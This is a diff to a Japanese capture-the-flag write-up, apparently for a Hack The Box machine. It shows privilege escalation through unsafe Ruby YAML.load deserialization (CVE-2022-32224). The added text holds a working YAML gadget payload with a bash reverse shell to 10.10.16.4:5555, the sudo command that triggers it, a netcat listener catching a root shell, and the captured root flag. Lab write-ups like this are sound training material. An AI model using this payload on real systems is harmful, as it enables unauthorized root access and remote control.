@@ -180,10 +180,10 @@ gems_file.each do |file_name, file_version|
     end
 end
 ```
-が、`YAML.load()`でyamlを読み込むとクラスを生成してしまうのでそこからコマンド実行の脆弱性があるらしい  
-またdependencies.ymlは絶対パスでないため、攻撃者のyaml経由でコマンド実行できる
+が、Ruby3.1以前は`YAML.load()`でyamlを読み込むとクラスを生成してしまうのでそこからコマンド実行の脆弱性があるらしい（CVE-2022-32224）  
+またdependencies.ymlは絶対パスでないため、カレントディレクトリ内の攻撃者のyaml経由でコマンド実行できる  
 [PoC](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)があるので、git_setでリバースシェルコマンドに編集
-```sh
+```yml
 ---
 - !ruby/object:Gem::Installer
     i: x
@@ -201,9 +201,10 @@ end
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
-             git_set: id
+             git_set: bash -c "bash -i >& /dev/tcp/10.10.16.4/5555 0>&1"
          method_id: :resolve
 ```
+dependencies.ymlダウンロードし、実行
 ```sh
 henry@precious:~$ cd /home/henry
 cd /home/henry
@@ -220,4 +221,58 @@ Saving to: ‘dependencies.yml’
      0K                                                       100%  119M=0s
 
 2025-07-02 10:08:14 (119 MB/s) - ‘dependencies.yml’ saved [667/667]
+
+
+henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `<main>'
+        32: from /opt/update_dependencies.rb:10:in `list_from_file'
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
+        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
+        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
+        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
+        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
+        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
+        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
+        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
+        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
+        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
+        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
+        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
+        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
+         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
+         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
+         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
+         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
+         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
+         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
+```
+リバースシェル取得！ルートフラグゲット！
+```sh
+└─$ rlwrap nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.129.228.98] 50478
+root@precious:/home/henry# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+root@precious:/home/henry# cat /root/root.txt
+cat /root/root.txt
+6afa1a7ac857a74c60f00f3f28d18f32
 ```
